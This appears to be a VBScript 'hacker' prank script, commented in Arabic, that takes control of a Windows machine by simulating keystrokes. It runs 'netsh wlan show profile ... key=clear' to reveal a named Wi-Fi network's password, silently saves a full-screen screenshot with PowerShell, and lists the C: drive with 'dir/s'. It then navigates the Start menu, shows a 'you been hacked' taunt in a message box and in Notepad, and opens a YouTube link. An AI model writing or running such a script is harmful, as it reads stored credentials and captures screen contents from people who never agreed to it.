Set x = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' تشغيل موجه الأوامر
x.Run "cmd.exe", 1, False
WScript.Sleep(300)

' جعل نافذة CMD هي النشطة
x.AppActivate "Command Prompt"
WScript.Sleep(200)
x.SendKeys "C:"
x.SendKeys "{ENTER}"
WScript.Sleep(200)
' إرسال الأوامر
x.SendKeys "color a"
x.SendKeys "{ENTER}"
WScript.Sleep(200)

x.SendKeys "netsh wlan show profile"
x.SendKeys "{ENTER}"
WScript.Sleep(200)
x.SendKeys "netsh wlan show profile  IdoomFibre_ATgCeHU78 key=clear "
x.SendKeys "{ENTER}"
WScript.Sleep(200)

scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)
savePath = scriptPath & "\screenshot.png"

' أمر PowerShell لالتقاط لقطة الشاشة
screenshotCmd = "powershell -command ""Add-Type -AssemblyName System.Windows.Forms; " & _
                "Add-Type -AssemblyName System.Drawing; " & _
                "$bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width," & _
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); " & _
                "$graphics = [System.Drawing.Graphics]::FromImage($bmp); " & _
                "$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); " & _
                "$bmp.Save('" & savePath & "');"""

' تنفيذ الامر
x.Run screenshotCmd, 0, True
WScript.Sleep(200)
x.SendKeys "exit"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(200)
x.run "cmd.exe"
WScript.Sleep(200)
x.SendKeys "color 4"
WScript.Sleep(200)
x.SendKeys "{ENTER}"
WScript.Sleep(200)
x.SendKeys "C:"
WScript.Sleep(200)
x.SendKeys "{ENTER}"
WScript.Sleep(200)
x.SendKeys "dir/s"
WScript.Sleep(200)
x.SendKeys "{ENTER}"
WScript.Sleep(200)
x.SendKeys "{F11}"
WScript.Sleep(700)
x.SendKeys "^c"
WScript.Sleep(200)
x.SendKeys "exit"
WScript.Sleep(200)
x.SendKeys "{ENTER}"
WScript.Sleep(300)
x.SendKeys "^{ESC}"
WScript.Sleep(300)
x.SendKeys "{TAB}"
WScript.Sleep(300)
x.SendKeys "{DOWN}"
WScript.Sleep(300)
x.SendKeys "{DOWN}"
WScript.Sleep(300)
x.SendKeys "{DOWN}"
WScript.Sleep(300)
x.SendKeys "{DOWN}"
WScript.Sleep(300)
x.SendKeys "{DOWN}"
WScript.Sleep(300)
x.SendKeys "{ENTER}"
WScript.Sleep(300)
x.SendKeys "{ESC}"
WScript.Sleep(300)
x.SendKeys "{ESC}"
MsgBox "you been hacked by me SCP 049 HACKER!!!"
WScript.Sleep(1000)
x.run "notepad.exe"
WScript.Sleep(300)
x.SendKeys "you been hacked by me SCP 049 HACKER!!!"
WScript.Sleep(3000)
x.SendKeys "%{F4}"
WScript.Sleep(4000)
x.SendKeys "{RIGHT}"
WScript.Sleep(1000)
x.SendKeys "{ENTER}"
WScript.Sleep(300)
x.Run """msedge.exe"""
WScript.Sleep(300)
x.SendKeys "https://www.youtube.com/watch?v=SapuxHJ3Z-E"
WScript.Sleep(300)
x.SendKeys "{ENTER}"
WScript.Sleep(4000)
x.SendKeys " "
WScript.Sleep(300)



